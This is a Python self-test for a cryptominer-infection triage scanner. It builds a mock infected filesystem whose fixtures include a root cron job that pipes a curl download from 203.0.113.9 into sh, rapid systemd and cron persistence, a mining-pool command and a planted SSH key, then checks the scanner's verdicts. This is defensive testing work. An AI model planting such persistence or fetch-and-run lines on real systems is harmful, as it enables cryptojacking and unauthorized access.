#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""selftest_icc_triage.py -- icc_triage.py 自带 mock 靶机自测(三例)

例1 感染靶树 -> 必须命中 ≥6 类且 exit=10
例2 干净靶树 -> 必须零命中且 exit=0
例3 路径不存在 -> exit=2
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
TRIAGE = HERE / 'icc_triage.py'

INFECTED = {
    # L2/L3 cron
    'etc/cron.d/zznvpmgr': '*/1 * * * * root /bin/sh /root/.local/share/ftpapp/.mgr/boot.sh\n',
    'etc/cron.d/zzantirev': '*/1 * * * * root /usr/bin/python3 /root/.local/share/ftpapp/.mgr/guard.py\n',
    'etc/cron.d/redisp0': '*/2 * * * * root curl -fsSL http://203.0.113.9/x/kworker | sh\n',
    'etc/cron.d/standard-jobs': '15 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n',
    'var/spool/cron/root': '*/5 * * * * /root/.local/share/ftpapp/.mgr/boot.sh\n',
    'etc/crontab': 'SHELL=/bin/sh\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n',
    # L1 systemd
    'etc/systemd/system/nvpmgr-heal.timer': '[Timer]\nOnUnitActiveSec=45s\nUnit=nvpmgr-heal.service\n',
    'etc/systemd/system/nvpmgr-heal.service': '[Service]\nExecStart=/root/.local/share/ftpapp/.mgr/boot.sh\nRestart=always\n',
    'etc/systemd/system/zzantirival.timer': '[Timer]\nOnUnitActiveSec=40s\nUnit=zzantirival.service\n',
    'etc/systemd/system/ssh.service': '[Service]\nExecStart=/usr/sbin/sshd -D\n',
    # 框架目录 + 三件套
    'root/.local/share/ftpapp/.mgr/boot.sh': '#!/bin/bash\n# pool worker\nsetsid ./x --pool stratum+tcp://pool.example:3333\n',
    'root/.local/share/ftpapp/.mgr/guard.py': "BAD = re.compile(r'xmrig|kinsing|frpc')\n",
    'root/.local/share/ftpapp/.mgr/antirival.rules': '[name_patterns]\ngate_ip=<redacted>\n',
    'root/.local/share/ftpapp/.mgr/evidence_kdevtmpfsi.1730000000': 'MZ...sample\n',
    # 载荷伪装 + 矿机路径
    'root/.cache/mesa_shader_cache/.v3/gl_blob_9f2c.dat': 'ELF...\n',
    'root/.local/share/ftpapp/profiles/p3f9a1c/krig-miner': 'ELF...\n',
    # L4
    'root/.ssh/authorized_keys': 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIx nvpmgr@heal\n',
    'home/victim/.ssh/authorized_keys': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB operator@laptop\n',
}
CLEAN = {
    'etc/cron.d/standard-jobs': '15 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n',
    'etc/crontab': 'SHELL=/bin/sh\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n',
    'etc/systemd/system/ssh.service': '[Service]\nExecStart=/usr/sbin/sshd -D\n',
    'root/.ssh/authorized_keys': 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIadmin admin@bastion\n',
    'root/.local/share/app/config.json': '{"theme":"dark"}\n',
}

rows = []


def build(root, tree):
    for rel, body in tree.items():
        p = Path(root) / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding='utf-8')
    os.utime(Path(root) / 'root/.ssh/authorized_keys', None)


def run(root):
    cp = subprocess.run([sys.executable, str(TRIAGE), '--root', str(root), '--json'],
                        capture_output=True, text=True, encoding='utf-8')
    try:
        data = json.loads(cp.stdout)
    except Exception:
        data = {'raw': cp.stdout, 'err': cp.stderr}
    return cp.returncode, data


def main():
    tmp = tempfile.mkdtemp(prefix='icc_selftest_')
    ok = True
    try:
        # 例1 感染
        inf = Path(tmp) / 'infected'
        build(inf, INFECTED)
        rc, data = run(inf)
        checks = set(data.get('by_check', {}))
        need = {'cron_zz_prefix', 'cron_pipe_shell', 'systemd_unit_framework',
                'timer_high_frequency', 'mgr_dir', 'payload_masquerade',
                'miner_in_profiles', 'authorized_keys_framework'}
        miss = need - checks
        p1 = rc == 10 and data.get('hits', 0) >= 8 and not miss
        rows.append(('例1 感染靶树 命中+exit10', p1,
                     'rc=%s hits=%s 命中类=%d 缺=%s' % (rc, data.get('hits'), len(checks), sorted(miss) or '无')))
        ok &= p1

        # 例2 干净
        cln = Path(tmp) / 'clean'
        build(cln, CLEAN)
        age = time.time() - 3 * 86400
        for rel in ('root/.ssh/authorized_keys',):
            os.utime(Path(cln) / rel, (age, age))
        rc, data = run(cln)
        p2 = (rc == 0 and data.get('hits') == 0
              and data.get('verdict') == 'CLEAN_NO_ICC_FRAMEWORK_MARK')
        rows.append(('例2 干净靶树 零命中+exit0', p2,
                     'rc=%s hits=%s verdict=%s' % (rc, data.get('hits'), data.get('verdict'))))
        ok &= p2

        # 例5 噪声项(仅 LOW): 干净树 + authorized_keys 刚被改写 -> 仍判 CLEAN, 但列出提示
        noise = Path(tmp) / 'noise'
        build(noise, CLEAN)
        rc, data = run(noise)
        p5 = (rc == 0 and data.get('hits_strong') == 0 and data.get('hits') == 1
              and 'authorized_keys_recent_write' in data.get('by_check', {})
              and data.get('verdict') == 'CLEAN_NO_ICC_FRAMEWORK_MARK')
        rows.append(('例5 仅LOW噪声 不定性 exit0', p5,
                     'rc=%s hits=%s 强=%s verdict=%s' % (rc, data.get('hits'),
                                                         data.get('hits_strong'), data.get('verdict'))))
        ok &= p5

        # 例3 错路径
        rc, data = run(Path(tmp) / 'nope')
        p3 = rc == 2
        rows.append(('例3 路径不存在 exit2', p3, 'rc=%s' % rc))
        ok &= p3

        # 例4 落盘读回(长任务路径)
        outp = Path(tmp) / 'out.json'
        cp = subprocess.run([sys.executable, str(TRIAGE), '--root', str(inf), '--out', str(outp)],
                            capture_output=True, text=True, encoding='utf-8')
        back = json.loads(outp.read_text(encoding='utf-8')) if outp.exists() else {}
        p4 = back.get('hits', 0) >= 8 and 'findings' in back
        rows.append(('例4 --out 落盘并读回', p4, 'file=%s hits=%s' % (outp.exists(), back.get('hits'))))
        ok &= p4
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    print('| 用例 | 结果 | 证据 |')
    print('|------|------|------|')
    for name, res, ev in rows:
        print('| %s | %s | %s |' % (name, 'PASS' if res else 'FAIL', ev))
    print('SELFTEST %s' % ('PASS' if ok else 'FAIL'))
    return 0 if ok else 1


if __name__ == '__main__':
    sys.exit(main())
